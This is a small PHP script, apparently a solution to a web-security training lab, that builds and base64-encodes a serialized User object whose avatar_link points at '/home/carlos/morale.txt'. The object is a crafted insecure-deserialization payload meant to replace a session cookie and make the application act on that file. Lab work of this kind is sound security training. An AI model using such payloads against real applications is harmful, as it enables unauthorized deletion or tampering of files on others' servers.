
<?php
class User {
    
    public $username;
    public $access_token;
    public $avatar_link;

    public function __construct($username,$access_token,$avatar_link)
    {
        $this->username = $username;
        $this->access_token = $access_token;
        $this->avatar_link = $avatar_link;
    }
}
$User = new User("wiener","k8mijlw638hqzbv4sqqgg1m2tyi4etg6","/home/carlos/morale.txt");
$serialUser = serialize(($User));
echo $serialUser,"<br>";
$SerialBase64User = base64_encode($serialUser);
echo $SerialBase64User;
?>